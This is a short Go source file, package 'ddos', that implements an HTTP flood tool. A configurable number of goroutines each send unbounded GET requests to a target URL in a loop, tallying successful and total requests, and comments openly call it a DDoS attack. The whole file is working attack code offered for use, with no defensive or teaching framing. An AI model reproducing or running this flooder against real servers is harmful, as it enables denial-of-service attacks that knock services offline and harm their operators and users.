package ddos

import (
	"io"
	"io/ioutil"
	"net/http"
	"runtime"
	"sync/atomic"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
}

// NewDDoS - initialization of new DDoS attack
func NewDDoS(url string, workers int) *DDoS {
	s := make(chan bool)
	if workers < 1 {
		workers = 1
	}
	return &DDoS{
		url:           url,
		stop:          &s,
		amountWorkers: workers,
	}
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
